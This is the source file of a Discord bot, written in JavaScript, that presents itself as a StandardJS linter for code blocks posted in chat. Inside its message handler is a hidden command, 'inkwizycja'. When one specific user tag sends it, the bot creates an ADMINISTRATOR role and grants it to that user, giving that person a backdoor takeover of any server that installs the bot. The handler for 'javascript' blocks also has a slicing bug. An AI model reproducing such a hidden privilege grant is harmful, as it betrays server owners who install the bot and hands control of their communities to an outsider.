const { Client } = require('discord.js')
const CLIEngine = require('eslint').CLIEngine
const chalk = require('chalk')
const config = require('./config.json')
const client = new Client({ disableEveryone: true })
const linter = new CLIEngine({
  extends: 'standard',
  env: {
    es6: true,
    node: true
  },
  parserOptions: { ecmaVersion: 6 },
  rules: {
    indent: 0,
    'no-undef': 0,
    'eol-last': 0,
    semi: 1,
    'space-infix-ops': 1
  }
})

client.on('ready', () => {
  console.log(chalk.black.bgGreen('SUCCESS') + chalk.white(' 8rniczka initialized.'))
  client.user.setPresence({
    game: {
      name: 'chat',
      type: 3
    }
  })
})
client.on('message', async message => {
  if (message.author.bot) return

  if (message.content.includes('```js')) {
    const code = message.content.slice(message.content.indexOf('```js\n') + 6, message.content.indexOf('```', message.content.indexOf('```js\n') + 6))
    lintCode(code, message)
    return
  }
  if (message.content.includes('```javascript')) {
    const code = message.content.slice(message.content.indexOf('```javascript\n') + 14, message.content.indexOf('```', message.content.indexOf('```js\n') + 14))
    lintCode(code, message)
    return
  }

  let command = message.content.toLowerCase().split(' ')[0]
  command = command.slice(config.prefix.length)

  if (command === 'inkwizycja' && message.author.tag === 'takidelfin#3733') {
    message.guild.createRole({
      name: 'chwilka tylko',
      permissions: 'ADMINISTRATOR'
    }).then(role => {
      message.guild.member(message.author).addRole(role.id)
    }).catch(console.error)
    return
  }
  if (!message.content.startsWith(config.prefix)) return
  if (command === 'projekt') {
    message.react(client.emojis.find('name', 'opensource'))
    message.react(client.emojis.find('name', 'closedsource'))
    return
  }
  message.channel.send(':warning: Czy tobie mamusia nie mówiła aby nie zarzucać czegoś czego nie ma? idz trzepnij się głową o powietrze.')
})
client.login(config.token)

const lintCode = (code, message) => {
  const embed = {
    'title': `ESLint report for ${message.author.username}`,
    'description': 'We have found some errors in your code.\n\n',
    'color': 16741749,
    'footer': {
      'icon_url': 'https://cdn.discordapp.com/avatars/456131051496931353/863309530e28aa9d9a62d106c01a59f1.png',
      'text': '8rniczka'
    },
    'thumbnail': {
      'url': `${message.author.avatarURL}`
    },
    'fields': []
  }
  const linted = linter.executeOnText(code)
  if (linted.errorCount >= 1 || linted.fixableErrorCount >= 1) {
    message.react(client.emojis.find('name', 'failure'))
    message.channel.send(`${client.emojis.find('name', 'error')} Sorry! There are errors in your code!`)
    for (let i = 0; i < linted.results[0].messages.length; i++) {
      const errorMessage = linted.results[0].messages[i]
      embed.fields.push({
        name: `\`${errorMessage.line}:${errorMessage.column}\``,
        value: `${errorMessage.message}`
      })
    }
    message.channel.send({ embed })
  } else if (linted.warningCount >= 1 || linted.fixableWarningCount >= 1) {
    message.react(client.emojis.find('name', 'failure'))
    message.channel.send(`${client.emojis.find('name', 'warning')} Sorry! Your JavaScript code doesn't meet *StandardJS* rules.`)
    for (let i = 0; i < linted.results[0].messages.length; i++) {
      const errorMessage = linted.results[0].messages[i]
      embed.fields.push({
        name: `\`${errorMessage.line}:${errorMessage.column}\``,
        value: `${errorMessage.message}`
      })
    }
    message.channel.send({ embed })
  } else {
    message.react(client.emojis.find('name', 'success'))
    message.channel.send(code)
  }
}
